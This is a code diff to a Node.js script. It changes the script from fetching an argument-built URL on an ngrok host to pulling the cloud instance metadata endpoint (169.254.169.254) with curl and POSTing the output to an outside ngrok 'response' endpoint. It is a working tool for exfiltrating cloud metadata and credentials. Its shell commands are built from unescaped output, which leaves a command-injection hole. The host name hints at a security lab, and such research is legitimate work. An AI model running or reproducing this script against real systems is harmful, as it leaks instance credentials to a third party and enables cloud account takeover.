@@ -1,15 +1,12 @@
 #!/usr/bin/env node
 const { exec } = require("child_process");
 
-// Base server URL
-const server = "nomasec-labs.ngrok.app"; // replace with your remote server
+// Metadata target and response endpoint
+const metadataUrl = "http://169.254.169.254/latest/meta-data/";
+const postResponseUrl = "https://nomasec-labs.ngrok.app/response";
 
-// Get command line argument to append to URL
-const userArgument = process.argv[2] || "";
-const targetUrl = `https://${server}/${userArgument}`;
-
-// Step 1: Fetch the content with curl
-exec(`curl "${targetUrl}"`, (error, stdout, stderr) => {
+// Fetch metadata
+exec(`curl "${metadataUrl}"`, (error, stdout, stderr) => {
   if (error) {
     console.error(`Error: ${error.message}`);
     process.exit(1);
@@ -17,13 +14,11 @@ exec(`curl "${targetUrl}"`, (error, stdout, stderr) => {
   if (stderr) {
     console.error(`Stderr: ${stderr}`);
   }
-  console.log("Received response:", stdout);
+  console.log("Metadata Response:", stdout);
 
-  // Step 2: Send the response back to the server as POST to /response
-  const postUrl = `https://${server}/response`;
-  // Escape the stdout for curl's --data argument
+  // Return result to response endpoint
   const postData = JSON.stringify({ content: stdout });
-  exec(`curl -X POST -H "Content-Type: application/json" --data '${postData}' "${postUrl}"`, (err, out, errout) => {
+  exec(`curl -X POST -H "Content-Type: application/json" --data '${postData}' "${postResponseUrl}"`, (err, out, errout) => {
     if (err) {
       console.error(`Error sending response: ${err.message}`);
       process.exit(1);
